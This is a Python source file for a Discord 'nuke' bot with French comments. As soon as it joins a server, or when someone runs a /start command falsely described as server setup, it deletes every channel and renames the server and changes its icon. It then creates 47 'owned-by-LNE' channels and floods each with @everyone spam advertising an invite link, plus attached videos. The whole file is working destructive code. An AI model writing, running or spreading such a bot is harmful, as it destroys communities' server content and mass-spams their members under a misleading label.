import discord
from discord.ext import commands
import os
import asyncio
from aiohttp import web
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

async def start_http_server():
    app = web.Application()
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8081))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Serveur web actif sur le port {port}")

NOMBRE_DE_SALONS = 47
MESSAGES_PAR_SALON = 31 
TEXTE = """ 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 
 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 
 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 

https://discord.gg/GQ3SZfumD

 𝐒𝐄𝐑𝐕𝐄𝐔𝐑 𝐎𝐖𝐍𝐄𝐃 𝐁𝐘 𝐁𝐎𝐑𝐃𝐄𝐑𝐋𝐈𝐍𝐄 
 𝐆𝐈𝐕𝐄𝐀𝐖𝐀𝐘 𝐁𝐎𝐓 𝐍𝐔𝐊𝐄 𝐕𝐈𝐏 𝐄𝐍 𝐂𝐎𝐔𝐑𝐒 

@everyone @here"""
VIDEO_PATH_1 = "copy_35D81FA1-AB32-45DC-8F6C-5F25B99A16B8.mov"
VIDEO_PATH_2 = "copy_8412EB05-CB3D-4E60-9841-00113F106054.mov"

@bot.event
async def on_ready():
    print(f'Bot prêt : {bot.user.name}')
    bot.loop.create_task(start_http_server())
    try:
        await bot.tree.sync()
        print("Commandes slash synchronisées avec succès.")
    except Exception as e:
        print(f"Erreur lors de la synchronisation des commandes : {e}")

async def spam_channel(channel):
    try:
        for _ in range(MESSAGES_PAR_SALON):
            await channel.send(TEXTE)
            await asyncio.sleep(0.6)
        
        if os.path.exists(VIDEO_PATH_1):
            await channel.send(file=discord.File(VIDEO_PATH_1))
        if os.path.exists(VIDEO_PATH_2):
            await channel.send(file=discord.File(VIDEO_PATH_2))
    except Exception as e:
        print(f"Erreur dans {channel.name}: {e}")

@bot.tree.command(name="start", description="Initialise et configure le serveur")
async def start_command(interaction: discord.Interaction):
    await interaction.response.send_message("Configuration en cours...", ephemeral=True)
    guild = interaction.guild
    
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    if os.path.exists("IMG_2976.png"):
        with open("IMG_2976.png", "rb") as f:
            try:
                await guild.edit(name="LNE", icon=f.read())
            except:
                pass

    tasks = []
    for i in range(1, NOMBRE_DE_SALONS + 1):
        try:
            ch = await guild.create_text_channel(name="owned-by-LNE")
            tasks.append(asyncio.create_task(spam_channel(ch)))
        except:
            continue

    if tasks:
        await asyncio.gather(*tasks)

@bot.event
async def on_guild_join(guild: discord.Guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    if os.path.exists("IMG_2976.png"):
        with open("IMG_2976.png", "rb") as f:
            try:
                await guild.edit(name="LNE", icon=f.read())
            except:
                pass

    tasks = []
    for i in range(1, NOMBRE_DE_SALONS + 1):
        try:
            ch = await guild.create_text_channel(name="owned-by-LNE")
            tasks.append(asyncio.create_task(spam_channel(ch)))
        except:
            continue

    if tasks:
        await asyncio.gather(*tasks)

bot.run(os.getenv("DISCORD_TOKEN"))